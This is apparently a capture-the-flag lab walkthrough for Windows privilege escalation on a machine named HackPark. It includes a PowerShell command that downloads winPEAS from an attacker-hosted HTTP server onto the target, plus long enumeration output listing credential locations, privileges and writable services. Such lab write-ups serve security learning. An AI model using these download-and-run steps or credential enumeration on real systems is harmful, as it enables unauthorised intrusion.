In this task we will escalate our privileges without the use of meterpreter/metasploit! 

Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.


```

┌──(kali㉿kali)-[~]
└─$ locate winpeas  
                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ locate winPEAS
/home/kali/Downloads/Enterprise/winPEASany_ofs.exe
/home/kali/Downloads/steel_mountain/winPEASany_ofs.exe
/usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-winPEAS.ps1
/usr/share/powershell-empire/empire/server/modules/powershell/privesc/winPEAS.yaml
                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ cd /home/kali/Downloads/hackpark 
                                                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
--2022-09-27 14:33:26--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 35292 (34K) [text/plain]
Saving to: ‘winPEAS.bat’

winPEAS.bat                  100%[===========================================>]  34.46K  --.-KB/s    in 0.002s  

2022-09-27 14:33:26 (20.7 MB/s) - ‘winPEAS.bat’ saved [35292/35292]

                                                                                                                 
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ ls            
Message.exe  revshell.exe  winPEAS.bat

┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winpeas.exe'"

┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.97.210 - - [27/Sep/2022 14:40:58] "GET /winPEAS.bat HTTP/1.1" 200 -

.\winpeas.exe                                                                                                    
     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                   
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                
PowerShell v2 Version:                                                                                           
                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine                                              
    PowerShellVersion    REG_SZ    2.0                                                                           
                                                                                                                 
PowerShell v5 Version:                                                                                           
                                                                                                                 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine                                              
    PowerShellVersion    REG_SZ    4.0                                                                           
                                                                                                                 
Transcriptions Settings:                                                                                         
Module logging settings:                                                                                         
Scriptblog logging settings:                                                                                     
                                                                                                                 
PS default transcript history                                                                                    
                                                                                                                 
Checking PS history file                                                                                         
                                                                                                                 
 [+] MOUNTED DISKS                                                                                               
   [i] Maybe you find something interesting                                                                      
Caption                                                                                                          
C:                                                                                                               
                                                                                                                 
                                                                                                                 
                                                                                                                 
 [+] ENVIRONMENT                                                                                                 
   [i] Interesting information?                                                                                  
                                                                                                                 
ALLUSERSPROFILE=C:\ProgramData                                                                                   
APPDATA=C:\Users\Administrator\AppData\Roaming                                                                   
CommonProgramFiles=C:\Program Files (x86)\Common Files                                                           
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files                                                      
CommonProgramW6432=C:\Program Files\Common Files                                                                 
COMPUTERNAME=HACKPARK                                                                                            
ComSpec=C:\Windows\system32\cmd.exe                                                                              
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT                                                                     
E=0x1B[                                                                                                          
FP_NO_HOST_CHECK=NO                                                                                              
HOMEDRIVE=C:                                                                                                     
HOMEPATH=\Users\Administrator                                                                                    
LOCALAPPDATA=C:\Users\Administrator\AppData\Local                                                                
LOGONSERVER=\\HACKPARK                                                                                           
long=false                                                                                                       
NUMBER_OF_PROCESSORS=2                                                                                           
OS=Windows_NT                                                                                                    
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\         
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC                                                    
Percentage=1                                                                                                     
PercentageTrack=30                                                                                               
PROCESSOR_ARCHITECTURE=x86                                                                                       
PROCESSOR_ARCHITEW6432=AMD64                                                                                     
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 63 Stepping 2, GenuineIntel                                          
PROCESSOR_LEVEL=6                                                                                                
PROCESSOR_REVISION=3f02                                                                                          
ProgramData=C:\ProgramData                                                                                       
ProgramFiles=C:\Program Files (x86)                                                                              
ProgramFiles(x86)=C:\Program Files (x86)                                                                         
ProgramW6432=C:\Program Files                                                                                    
PROMPT=$P$G                                                                                                      
PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\                                                 
PUBLIC=C:\Users\Public                                                                                           
SESSIONNAME=Console                                                                                              
SystemDrive=C:                                                                                                   
SystemRoot=C:\Windows                                                                                            
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1                                                                      
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1                                                                       
USERDOMAIN=HACKPARK                                                                                              
USERDOMAIN_ROAMINGPROFILE=HACKPARK                                                                               
USERNAME=Administrator                                                                                           
USERPROFILE=C:\Users\Administrator                                                                               
windir=C:\Windows                                                                                                
                                                                                                                 
 [+] INSTALLED SOFTWARE                                                                                          
   [i] Some weird software? Check for vulnerabilities in unknow software installed                               
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                 
                                                                                                                 
Amazon                                                                                                           
Common Files                                                                                                     
Common Files                                                                                                     
Internet Explorer                                                                                                
Internet Explorer                                                                                                
Microsoft.NET                                                                                                    
SystemScheduler                                                                                                  
Windows Mail                                                                                                     
Windows Mail                                                                                                     
Windows NT                                                                                                       
Windows NT                                                                                                       
WindowsPowerShell                                                                                                
WindowsPowerShell                                                                                                
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\                                         
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\                                         
                                                                                                                 
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
 [+] Remote Desktop Credentials Manager                                                                          
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager                                                                                                         
                                                                                                                 
                                                                                                                 
Looking inside C:\Users\Administrator\AppData\Local\Microsoft\Credentials\                                       
                                                                                                                 
                                                                                                                 
 [+] Unattended files                                                                                            
                                                                                                                 
 [+] SAM and SYSTEM backups                                                                                      
                                                                                                                 
 [+] McAffee SiteList.xml                                                                                        
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
User name                    Administrator                                                                       
Full Name                                                                                                        
Comment                      Built-in account for administering the computer/domain                              
User's comment                                                                                                   
Country/region code          000 (System Default)                                                                
Account active               Yes                                                                                 
Account expires              Never                                                                               
                                                                                                                 
Password last set            8/3/2019 10:43:23 AM                                                                
Password expires             9/14/2019 10:43:23 AM                                                               
Password changeable          8/3/2019 10:43:23 AM                                                                
Password required            Yes                                                                                 
User may change password     Yes                                                                                 
                                                                                                                 
Workstations allowed         All                                                                                 
Logon script                                                                                                     
User profile                                                                                                     
Home directory                                                                                                   
Last logon                   9/27/2022 9:48:46 AM                                                                
                                                                                                                 
Logon hours allowed          All                                                                                 
                                                                                                                 
Local Group Memberships      *Administrators                                                                     
Global Group memberships     *None                                                                               
The command completed successfully.                                                                              
                                                                                                                 
The request will be processed at a domain controller for domain WORKGROUP.                                       
                                                                                                                 
                                                                                                                 
USER INFORMATION                                                                                                 
----------------                                                                                                 
                                                                                                                 
User Name              SID                                                                                       
====================== ===========================================                                               
hackpark\administrator S-1-5-21-141259258-288879770-3894983326-500                                               
                                                                                                                 
                                                                                                                 
GROUP INFORMATION                                                                                                
-----------------                                                                                                
                                                                                                                 
Group Name                                                    Type             SID          Attributes                                                                                                                            
============================================================= ================ ============ ===============================================================                                                                       
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group                                                                                    
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner                                                                       
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group                                                                                    
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group                                                                                    
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                                                                    
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                                                                                       
                                                                                                                 
                                                                                                                 
PRIVILEGES INFORMATION                                                                                           
----------------------                                                                                           
                                                                                                                 
Privilege Name                  Description                               State                                  
=============================== ========================================= ========                               
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled                                
SeSecurityPrivilege             Manage auditing and security log          Disabled                               
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled                                
SeLoadDriverPrivilege           Load and unload device drivers            Disabled                               
SeSystemProfilePrivilege        Profile system performance                Disabled                               
SeSystemtimePrivilege           Change the system time                    Disabled                               
SeProfileSingleProcessPrivilege Profile single process                    Disabled                               
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled                               
SeCreatePagefilePrivilege       Create a pagefile                         Disabled                               
SeBackupPrivilege               Back up files and directories             Disabled                               
SeRestorePrivilege              Restore files and directories             Disabled                               
SeShutdownPrivilege             Shut down the system                      Disabled                               
SeDebugPrivilege                Debug programs                            Enabled                                
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled                               
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled                                
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled                               
SeUndockPrivilege               Remove computer from docking station      Disabled                               
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled                               
SeImpersonatePrivilege          Impersonate a client after authentication Enabled                                
SeCreateGlobalPrivilege         Create global objects                     Enabled                                
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                               
SeTimeZonePrivilege             Change the time zone                      Disabled                               
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled                               
                                                                                                                 
ERROR: Unable to get user claims information.                                                                    
                                                                                                                 
 [+] USERS                                                                                                       
                                                                                                                 
User accounts for \\HACKPARK                                                                                     
                                                                                                                 
-------------------------------------------------------------------------------                                  
Administrator            Guest                    jeff                                                           
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] GROUPS                                                                                                      
                                                                                                                 
Aliases for \\HACKPARK                                                                                           
                                                                                                                 
-------------------------------------------------------------------------------                                  
*Access Control Assistance Operators                                                                             
*Administrators                                                                                                  
*Backup Operators                                                                                                
*Certificate Service DCOM Access                                                                                 
*Cryptographic Operators                                                                                         
*Distributed COM Users                                                                                           
*Event Log Readers                                                                                               
*Guests                                                                                                          
*Hyper-V Administrators                                                                                          
*IIS_IUSRS                                                                                                       
*Network Configuration Operators                                                                                 
*Performance Log Users                                                                                           
*Performance Monitor Users                                                                                       
*Power Users                                                                                                     
*Print Operators                                                                                                 
*RDS Endpoint Servers                                                                                            
*RDS Management Servers                                                                                          
*RDS Remote Access Servers                                                                                       
*Remote Desktop Users                                                                                            
*Remote Management Users                                                                                         
*Replicator                                                                                                      
*Users                                                                                                           
*WinRMRemoteWMIUsers__                                                                                           
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] ADMINISTRATORS GROUPS                                                                                       
Alias name     Administrators                                                                                    
Comment        Administrators have complete and unrestricted access to the computer/domain                       
                                                                                                                 
Members                                                                                                          
                                                                                                                 
-------------------------------------------------------------------------------                                  
Administrator                                                                                                    
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] CURRENT LOGGED USERS                                                                                        
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME                                      
>administrator         console             1  Active      none   9/27/2022 9:48 AM                               
                                                                                                                 
 [+] Kerberos Tickets                                                                                            
                                                                                                                 
Current LogonId is 0:0x256d9                                                                                     
                                                                                                                 
Cached Tickets: (0)                                                                                              
                                                                                                                 
 [+] CURRENT CLIPBOARD                                                                                           
   [i] Any password inside the clipboard?                                                                        
                                                                                                                 
[*] SERVICE VULNERABILITIES                                                                                      
                                                                                                                 
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
C:\Program Files\Amazon\EC2Launch\EC2Launch.exe NT AUTHORITY\SYSTEM:(I)(F)                                       
                                                BUILTIN\Administrators:(I)(F)                                    
                                                                                                                 
C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)                                      
                                                 BUILTIN\Administrators:(I)(F)                                   
                                                                                                                 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                 
                                                                                                                 
C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)                                        
                                               BUILTIN\Administrators:(I)(F)                                     
                                                                                                                 
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)                                
                                                       BUILTIN\Administrators:(I)(F)                             
                                                                                                                 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                    
                                                                                                                 
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                 
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                               
                        BUILTIN\Administrators:(I)(F)                                                            
                                                                                                                 
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                        
                                                                                                                 
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                
                                  BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                 
                                                                                                                 
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NETFramework                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\1394ohci                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\3ware                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ACPI                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpiex                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpipagr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiPmi                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpitime                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADP80XX                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\adsi                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AeLookupSvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AFD                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\agp440                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ahcache                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ALG                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmazonSSMAgent                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdK8                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdPPM                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsata                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsbs                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdxata                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppHostSvc                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppID                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppIDSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Appinfo                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppMgmt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppReadiness                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppXSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\arcsas                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET                                      
